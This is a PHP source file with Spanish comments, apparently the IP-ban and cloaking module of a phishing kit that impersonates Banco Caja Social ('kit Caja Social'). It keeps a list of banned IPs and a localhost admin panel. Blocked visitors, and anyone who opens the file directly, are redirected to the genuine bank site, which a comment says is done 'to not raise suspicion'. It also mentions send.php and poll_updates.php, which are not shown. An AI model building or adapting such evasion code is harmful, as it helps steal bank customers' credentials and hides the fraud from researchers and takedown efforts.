<?php
/**
 * ban_ip.php — Bloqueo de IP para el kit Caja Social
 *
 * Uso desde cualquier pagina del kit:
 *   require_once __DIR__ . '/ban_ip.php';   // banea y mata ejecucion si aplica
 *
 * Uso desde send.php / poll_updates.php (llamado antes de procesar):
 *   require_once __DIR__ . '/ban_ip.php';
 *
 * Administracion via GET (solo desde localhost o IP de admin):
 *   ban_ip.php?action=list              — lista todas las IPs baneadas
 *   ban_ip.php?action=ban&ip=1.2.3.4   — banea una IP manualmente
 *   ban_ip.php?action=unban&ip=1.2.3.4 — desbanea una IP
 *   ban_ip.php?action=clear             — limpia todas las entradas
 */

define('BAN_FILE',    __DIR__ . '/data/banned_ips.json');
define('BAN_LOG',     __DIR__ . '/data/ban_log.txt');
define('BAN_ADMIN_IP', '127.0.0.1');   // Cambiar si el admin accede desde otra IP

// ── Helpers ────────────────────────────────────────────────────────────────

function ban_get_client_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = trim(explode(',', $_SERVER[$key])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

function ban_load(): array {
    if (!file_exists(BAN_FILE)) return [];
    $raw = @file_get_contents(BAN_FILE);
    return $raw ? (json_decode($raw, true) ?? []) : [];
}

function ban_save(array $data): void {
    $dir = dirname(BAN_FILE);
    if (!is_dir($dir)) mkdir($dir, 0750, true);
    file_put_contents(BAN_FILE, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function ban_log(string $msg): void {
    $dir = dirname(BAN_LOG);
    if (!is_dir($dir)) mkdir($dir, 0750, true);
    $line = '[' . date('Y-m-d H:i:s') . '] ' . $msg . PHP_EOL;
    file_put_contents(BAN_LOG, $line, FILE_APPEND | LOCK_EX);
}

function ban_ip_add(string $ip, string $reason = 'manual'): void {
    $data = ban_load();
    $data[$ip] = ['at' => date('Y-m-d H:i:s'), 'reason' => $reason];
    ban_save($data);
    ban_log("BANNED $ip reason=$reason");
}

function ban_ip_remove(string $ip): void {
    $data = ban_load();
    unset($data[$ip]);
    ban_save($data);
    ban_log("UNBANNED $ip");
}

function ban_is_banned(string $ip): bool {
    $data = ban_load();
    return isset($data[$ip]);
}

// ── Bloquear al visitante si su IP esta baneada ────────────────────────────

$client_ip = ban_get_client_ip();

if (ban_is_banned($client_ip)) {
    // Solo si no estamos en modo admin
    $is_admin_req = (isset($_GET['action']) && $client_ip === BAN_ADMIN_IP);
    if (!$is_admin_req) {
        ban_log("BLOCKED $client_ip");
        http_response_code(403);
        // Redirigir a la pagina real del banco para no levantar sospechas
        header('Location: https://bancapersonas.bancocajasocial.com');
        exit;
    }
}

// ── Panel de administracion (solo accesible desde BAN_ADMIN_IP) ─────────

if (isset($_GET['action']) && $client_ip === BAN_ADMIN_IP) {
    header('Content-Type: application/json; charset=utf-8');
    $action = $_GET['action'];

    switch ($action) {
        case 'list':
            echo json_encode(['ok' => true, 'banned' => ban_load()]);
            break;

        case 'ban':
            $ip = filter_var($_GET['ip'] ?? '', FILTER_VALIDATE_IP);
            if (!$ip) { echo json_encode(['ok' => false, 'error' => 'IP invalida']); break; }
            ban_ip_add($ip, 'admin-manual');
            echo json_encode(['ok' => true, 'banned' => $ip]);
            break;

        case 'unban':
            $ip = filter_var($_GET['ip'] ?? '', FILTER_VALIDATE_IP);
            if (!$ip) { echo json_encode(['ok' => false, 'error' => 'IP invalida']); break; }
            ban_ip_remove($ip);
            echo json_encode(['ok' => true, 'unbanned' => $ip]);
            break;

        case 'clear':
            ban_save([]);
            ban_log("CLEAR all by admin $client_ip");
            echo json_encode(['ok' => true, 'message' => 'Lista limpiada']);
            break;

        default:
            echo json_encode(['ok' => false, 'error' => 'Accion desconocida']);
    }
    exit;
}

// Si el archivo fue incluido (require_once) el flujo continua normalmente.
// Si fue solicitado directamente como pagina, redirigir al banco.
if (basename($_SERVER['SCRIPT_FILENAME']) === 'ban_ip.php') {
    header('Location: https://bancapersonas.bancocajasocial.com');
    exit;
}
